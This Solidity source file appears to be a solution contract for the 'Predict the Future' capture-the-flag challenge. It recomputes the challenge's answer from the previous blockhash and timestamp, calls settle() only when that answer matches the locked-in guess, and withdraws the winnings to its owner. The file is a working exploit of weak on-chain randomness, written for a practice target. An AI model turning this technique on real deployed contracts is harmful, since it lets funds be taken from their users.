pragma solidity ^0.4.21;

import "./PredictTheFuture.sol";

contract PredictTheFutureSolution {
  address owner;

  event TestEvent(
    uint8 answer
  );

  constructor() public {
    owner = msg.sender;
  }

  function lockInGuess(PredictTheFuture challenge, uint8 n) public payable {
    require(msg.value == 1 ether, "Missing 1 ether");
    challenge.lockInGuess.value(msg.value)(n);
  }

  function trySettle(PredictTheFuture challenge, uint8 guess) public {
    uint8 answer = uint8(keccak256(blockhash(block.number - 1), now)) % 10;
    if (answer == guess) {
      emit TestEvent(answer);
      challenge.settle();
      withdraw();
    }
  }

  function () public payable { }

  function withdraw() public {
    owner.transfer(address(this).balance);
  }
}
